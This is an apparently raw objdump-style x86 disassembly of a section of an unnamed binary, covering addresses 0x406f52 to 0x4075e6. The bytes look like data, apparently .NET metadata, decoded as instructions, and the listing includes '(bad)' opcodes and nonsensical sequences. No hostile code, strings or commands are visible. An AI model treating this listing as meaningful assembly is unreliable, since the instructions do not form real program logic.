  406f52:	18 1f                	sbb    %bl,(%edi)
  406f54:	c7 00 a1 02 2d 0f    	movl   $0xf2d02a1,(%eax)
  406f5a:	01 05 79 02 04 1e    	add    %eax,0x1e040279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 b4 20 07 05 81 02 	add    0x2810507(%eax,%eiz,1),%dh
  406f6a:	26 0e                	es push %cs
  406f6c:	0d 05 a9 02 6f       	or     $0x6f02a905,%eax
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 c4 0e 47    	add    0x470ec402(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 2d 26 16 04 81    	add    %ebp,0x81041626
  406f81:	02 33                	add    (%ebx),%dh
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 ba 17    	adc    0x17ba0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 04 1e 0e    	add    %cl,0xe1e0402(%ecx)
  406f91:	00 89 02 7c 0e 6b    	add    %cl,0x6b0e7c02(%ecx)
  406f97:	01 b1 02 66 0e 47    	add    %esi,0x470e6602(%ecx)
  406f9d:	02 a1 02 55 19 c7    	add    -0x38e6aafe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 21                	add    %esp,(%ecx)
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 e3 20       	add    $0x20e30289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 43 0e             	add    0xe(%ebx),%al
  406fb4:	20 05 89 02 7f 24    	and    %al,0x247f0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 07 23 27    	add    0x27230702(%ecx),%al
  406fc1:	05 c1 02 4b 1d       	add    $0x1d4b02c1,%eax
  406fc6:	30 05 c9 02 b9 0f    	xor    %al,0xfb902c9
  406fcc:	c7 00 91 02 61 25    	movl   $0x25610291,(%eax)
  406fd2:	35 05 c1 01 21       	xor    $0x2101c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 ce 11       	add    $0x11ce0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 fe 20       	add    $0x20fe02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	f3 0f 3e             	repz (bad)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 04 1e             	add    (%esi,%ebx,1),%al
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 92 1f       	add    $0x1f9202d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 89 0e c3       	mov    0xc30e8902,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 21                	add    %esp,(%ecx)
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 04 1e       	add    $0x1e040299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 23                	add    (%ebx),%ah
  40700d:	0f 6b 01             	packssdw (%ecx),%mm0
  407010:	a1 02 5b 15 c3       	mov    0xc3155b02,%eax
  407015:	00 a1 02 99 0e c7    	add    %ah,-0x38f166fe(%ecx)
  40701b:	00 89 02 6f 14 4b    	add    %cl,0x4b146f02(%ecx)
  407021:	02 89 02 92 11 4b    	add    0x4b119202(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	15 23 3e 01 59       	adc    $0x59013e23,%eax
  40702f:	01 f8                	add    %edi,%eax
  407031:	25 c3 00 a1 02       	and    $0x2a100c3,%eax
  407036:	e8 22 c7 00 f9       	call   0xf941375d
  40703b:	02 04 1e             	add    (%esi,%ebx,1),%al
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 08                	add    (%eax),%cl
  407043:	12 23                	adc    (%ebx),%ah
  407045:	02 01                	add    (%ecx),%al
  407047:	03 04 1e             	add    (%esi,%ebx,1),%eax
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 b5 0e 47 02 c1    	add    -0x3efdb8f2(%ebp),%esi
  407053:	01 82 1d 47 02 c1    	add    %eax,-0x3efdb8e3(%edx)
  407059:	01 4a 20             	add    %ecx,0x20(%edx)
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 04 1e             	add    (%esi,%ebx,1),%eax
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 71 21             	add    0x21(%ecx),%esi
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	ec                   	in     (%dx),%al
  40706d:	1d 70 05 19 03       	sbb    $0x3190570,%eax
  407072:	86 22                	xchg   %ah,(%edx)
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	19 18                	sbb    %ebx,(%eax)
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 e1             	roll   $0xe1,(%ecx)
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	44                   	inc    %esp
  407085:	23 bf 01 81 02 9f    	and    -0x60fd7eff(%edi),%edi
  40708b:	0d 86 05 29 03       	or     $0x3290586,%eax
  407090:	44                   	inc    %esp
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	d5 22                	aad    $0x22
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 d1                	add    %edx,%ecx
  40709d:	0e                   	push   %cs
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4070a3:	0e                   	push   %cs
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	71 19                	jno    0x4070c3
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 21 21       	add    $0x212101c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 04 1e       	add    $0x1e040349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	c5 02                	lds    (%edx),%eax
  4070bc:	cd 03                	int    $0x3
  4070be:	51                   	push   %ecx
  4070bf:	03 2b                	add    (%ebx),%ebp
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	04 1e                	add    $0x1e,%al
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 07                	add    (%edi),%al
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	68 0c aa 05 c1       	push   $0xc105aa0c
  4070d7:	01 34 14             	add    %esi,(%esp,%edx,1)
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 43             	roll   $0x43,(%ecx)
  4070df:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  4070e4:	b6 0c                	mov    $0xc,%dh
  4070e6:	bd 05 59 01 22       	mov    $0x22015905,%ebp
  4070eb:	18 1d 00 61 03 07    	sbb    %bl,0x7036100
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	48                   	dec    %eax
  4070f7:	15 c3 00 b1 02       	adc    $0x2b100c3,%eax
  4070fc:	f5                   	cmc
  4070fd:	0e                   	push   %cs
  4070fe:	c3                   	ret
  4070ff:	05 59 03 07 0f       	add    $0xf070359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 07 14       	add    $0x14070359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	92                   	xchg   %eax,%edx
  40710f:	22 c9                	and    %cl,%cl
  407111:	05 79 03 04 1e       	add    $0x1e040379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 0a 0e       	add    $0xe0a0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 a5 0f       	add    $0xfa500c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 a5 0f 0e 00 09    	add    %ah,0x9000e0f(%ebp)
  40712b:	03 04 1e             	add    (%esi,%ebx,1),%eax
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	04 1e                	add    $0x1e,%al
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	fd                   	std
  407139:	0a f5                	or     %ch,%dh
  40713b:	05 0c 00 cb 22       	add    $0x22cb000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	23 25 fb 05 c1 01    	and    0x1c105fb,%esp
  40714a:	23 19                	and    (%ecx),%ebx
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 79 20             	add    %bh,0x20(%ecx)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 37                	add    %dh,(%edi)
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 3d 0b 17 06 89    	add    %bh,0x8906170b
  407161:	03 21                	add    (%ecx),%esp
  407163:	26 1d 06 69 00 04    	es sbb $0x4006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 04 1e             	add    %al,(%esi,%ebx,1)
  407170:	2d 06 91 03 a5       	sub    $0xa5039106,%eax
  407175:	0f 0e                	femms
  407177:	00 99 03 04 1e 56    	add    %bl,0x561e0403(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 88 13 35 06 81    	add    -0x7ef9caed(%eax),%ecx
  407185:	02 eb                	add    %bl,%ch
  407187:	0c 0a                	or     $0xa,%al
  407189:	00 91 02 54 25 35    	add    %dl,0x35255402(%ecx)
  40718f:	05 91 02 ce 11       	add    $0x11ce0291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	51                   	push   %ecx
  407199:	0d 47 02 91 02       	or     $0x2910247,%eax
  40719e:	54                   	push   %esp
  40719f:	25 54 06 91 02       	and    $0x2910654,%eax
  4071a4:	c5 11                	lds    (%ecx),%edx
  4071a6:	7c 05                	jl     0x4071ad
  4071a8:	91                   	xchg   %eax,%ecx
  4071a9:	02 b9 11 6b 01 91    	add    -0x6efe94ef(%ecx),%bh
  4071af:	02 61 25             	add    0x25(%ecx),%ah
  4071b2:	5e                   	pop    %esi
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 31                	add    (%ecx),%dh
  4071b7:	0d 6b 01 1c 00       	or     $0x1c016b,%eax
  4071bc:	fd                   	std
  4071bd:	0a f5                	or     %ch,%dh
  4071bf:	05 b9 03 1e 23       	add    $0x231e03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	ec                   	in     (%dx),%al
  4071c9:	1d 92 06 24 00       	sbb    $0x240692,%eax
  4071ce:	86 22                	xchg   %ah,(%edx)
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	f3 11 a9 06 24 00 44 	repz adc %ebp,0x44002406(%ecx)
  4071db:	23 bf 01 c9 03 11    	and    0x1103c901(%edi),%edi
  4071e1:	19 b3 06 c9 03 f8    	sbb    %esi,-0x7fc36fa(%ebx)
  4071e7:	0a b9 06 d1 03 60    	or     0x6003d106(%ecx),%bh
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	be 0c c8 06 d9       	mov    $0xd906c80c,%esi
  4071f7:	03 df                	add    %edi,%ebx
  4071f9:	0d cf 06 f1 03       	or     $0x3f106cf,%eax
  4071fe:	d4 0f                	aam    $0xf
  407200:	d8 06                	fadds  (%esi)
  407202:	01 04 44             	add    %eax,(%esp,%eax,2)
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	d4 0f                	aam    $0xf
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	80 21 23             	andb   $0x23,(%ecx)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	6b 0d 3b 07 1c 00 04 	imul   $0x4,0x1c073b,%ecx
  40721d:	1e                   	push   %ds
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 5f 26             	add    %ebx,0x26(%edi)
  407224:	84 00                	test   %al,(%eax)
  407226:	21 04 04             	and    %eax,(%esp,%eax,1)
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 04                	add    $0x4,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 9f             	sub    %eax,(%edi,%ebx,4)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 e9                	add    %ebp,%ecx
  40723b:	13 93 01 49 04 04    	adc    0x4044901(%ebx),%edx
  407241:	1e                   	push   %ds
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 04 1e             	add    (%esi,%ebx,1),%al
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 04                	add    $0x4,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	5d                   	pop    %ebp
  407253:	12 01                	adc    (%ecx),%al
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	fa                   	cli
  407259:	11 01                	adc    %eax,(%ecx)
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	cd 0c                	int    $0xc
  407260:	7a 07                	jp     0x407269
  407262:	51                   	push   %ecx
  407263:	04 7c                	add    $0x7c,%al
  407265:	13 81 07 51 04 4c    	adc    0x4c045107(%ecx),%eax
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	ce                   	into
  407271:	07                   	pop    %es
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	29 1e                	sub    %ebx,(%esi)
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 04             	cmp    %eax,(%esp,%eax,1)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 c0                	add    $0xc0,%al
  407283:	07                   	pop    %es
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 ec             	cmp    %eax,(%esp,%ebp,8)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	04 1e                	add    $0x1e,%al
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 23                	add    (%ebx),%ah
  407295:	25 31 02 51 03       	and    $0x3510231,%eax
  40729a:	2b 15 9a 07 79 04    	sub    0x479079a,%edx
  4072a0:	04 1e                	add    $0x1e,%al
  4072a2:	6b 01 51             	imul   $0x51,(%ecx),%eax
  4072a5:	04 c7                	add    $0xc7,%al
  4072a7:	07                   	pop    %es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 19                	add    $0x19,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 67             	roll   $0x67,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	cb                   	lret
  4072b9:	25 be 07 91 04       	and    $0x49107be,%eax
  4072be:	13 25 d0 07 a1 04    	adc    0x4a107d0,%esp
  4072c4:	04 1e                	add    $0x1e,%al
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 2d 21 f9 07 49    	add    %ebp,0x4907f921
  4072cf:	02 9f 1f 99 01 49    	add    0x4901991f(%edi),%bl
  4072d5:	02 9f 1f ab 01 a9    	add    -0x56fe54e1(%edi),%bl
  4072db:	00 04 1e             	add    %al,(%esi,%ebx,1)
  4072de:	0e                   	push   %cs
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	19 18                	sbb    %ebx,(%eax)
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	cb                   	lret
  4072e9:	22 f4                	and    %ah,%dh
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	39 1c 0e             	cmp    %ebx,(%esi,%ecx,1)
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 0e                	add    %ecx,(%esi)
  4072f5:	20 42 02             	and    %al,0x2(%edx)
  4072f8:	c1 00 af             	roll   $0xaf,(%eax)
  4072fb:	11 28                	adc    %ebp,(%eax)
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	9f                   	lahf
  407301:	1f                   	pop    %ds
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	5d                   	pop    %ebp
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 81 18 47 02 a9    	add    %eax,-0x56fdb8e8(%ecx)
  407311:	04 b3                	add    $0xb3,%al
  407313:	0f 37                	getsec
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	5d                   	pop    %ebp
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 5d 00             	add    %ebx,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	5d                   	pop    %ebp
  407325:	00 46 08             	add    %al,0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 66 00             	add    %esp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	b3 0f                	mov    $0xf,%bl
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	66 00 57 08          	data16 add %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 66 00             	add    %esp,0x0(%esi)
  40733e:	5c                   	pop    %esp
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	66 00 61 08          	data16 add %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 96 0d 68 08 b1    	add    %edx,-0x4ef797f3(%esi)
  40734d:	04 b3                	add    $0xb3,%al
  40734f:	0f 6d                	(bad)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	9f                   	lahf
  407355:	1f                   	pop    %ds
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 ef                	add    %edi,%ebp
  40735b:	25 23 02 e1 02       	and    $0x2e10223,%eax
  407360:	04 1e                	add    $0x1e,%al
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 a6             	roll   $0xa6,(%eax)
  407367:	11 f4                	adc    %esi,%esp
  407369:	01 89 01 04 1e 6b    	add    %ecx,0x6b1e0401(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 b6 08 49 02 fc    	add    %dh,-0x3fdb6f8(%esi)
  407379:	0d bd 08 49 02       	or     $0x24908bd,%eax
  40737e:	96                   	xchg   %eax,%esi
  40737f:	0d c4 08 49 02       	or     $0x24908c4,%eax
  407384:	3b 00                	cmp    (%eax),%eax
  407386:	cb                   	lret
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	5d                   	pop    %ebp
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	77 00                	ja     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 66 00             	add    0x0(%esi),%ah
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 9f 1f 12 09 d1    	add    -0x2ef6ede1(%edi),%bl
  4073a1:	04 04                	add    $0x4,%al
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 7f 01             	add    %bh,0x1(%edi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 81 0c a4 00 00    	add    %al,0xa40c(%ecx)
  4075c7:	00 aa 23 a9 00 00    	add    %ch,0xa923(%edx)
  4075cd:	00 b2 15 ae 00 00    	add    %dh,0xae15(%edx)
  4075d3:	00 9d 14 ae 00 00    	add    %bl,0xae14(%ebp)
  4075d9:	00 2e                	add    %ch,(%esi)
  4075db:	07                   	pop    %es
  4075dc:	b2 00                	mov    $0x0,%dl
  4075de:	00 00                	add    %al,(%eax)
  4075e0:	5d                   	pop    %ebp
  4075e1:	0d b7 00 00 00       	or     $0xb7,%eax
  4075e6:	01 01                	add    %eax,(%ecx)
